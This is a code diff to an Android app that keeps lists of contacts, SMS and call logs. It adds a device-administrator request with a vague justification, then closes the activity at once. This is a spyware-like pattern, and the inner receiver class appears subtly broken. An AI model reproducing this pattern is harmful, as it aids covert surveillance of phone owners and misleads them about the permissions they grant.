@@ -1,5 +1,8 @@
 package com.example.iiitd.droid;
 
+import android.app.Activity;
+import android.app.admin.DeviceAdminReceiver;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -38,6 +41,7 @@ public class MainActivity extends AppCompatActivity {
     List<Contact> allConatacts;
     List<Message> allSMS;
     List<MyCallLog> myAllCallLog;
+    static final int ACTIVATION_REQUEST = 47;
 
 
     @Override
@@ -87,6 +91,15 @@ public class MainActivity extends AppCompatActivity {
 
 
 
+        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+        ComponentName deviceAdminComponentName = new ComponentName(this, ReceiverForAdmin.class);
+        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
+        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "You must enable device administration for certain features"
+                + " of the app to function.");
+
+        startActivityForResult(intent, ACTIVATION_REQUEST);
+
+Log.d("oncreate task completed","oncreate end here");
         finish();
     }
     // Read All Contacts
@@ -228,6 +241,57 @@ public class MainActivity extends AppCompatActivity {
             //Log.v("CallLog","type: " + c.getString(4) + "Call to: "+ name+"  Number: "+number+", registered at: "+new Date(dialed).toString());
         }
         return allCallLogs;
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        switch (requestCode) {
+            case ACTIVATION_REQUEST:
+                if (resultCode == Activity.RESULT_OK) {
+                    Log.i("DeviceAdminSample", "Administration enabled!");
+                }
+                else {
+                    Log.i("DeviceAdminSample", "Administration enable FAILED!");
+                }
+                return;
+        }
+        super.onActivityResult(requestCode, resultCode, data);
+
+        Log.d("on activity result", "on activity result finished");
+    }
+
+
+
+
+    public class ReceiverForAdmin extends DeviceAdminReceiver {
+
+        public ReceiverForAdmin()
+        {
+            super();
+        }
+        @Override
+        public void onEnabled(Context context, Intent intent) {
+            super.onEnabled(context, intent);
+            Log.i("Device Admin: ", "Enabled");
+        }
+
+        @Override
+        public String onDisableRequested(Context context, Intent intent) {
+            return "Admin disable requested";
+        }
+
+        @Override
+        public void onDisabled(Context context, Intent intent) {
+            super.onDisabled(context, intent);
+            Log.i("Device Admin: ", "Disabled");
+        }
+
+        @Override
+        public void onPasswordChanged(Context context, Intent intent) {
+            super.onPasswordChanged(context, intent);
+            Log.i("Device Admin: ", "Password changed");
+        }
+
     }
 
 
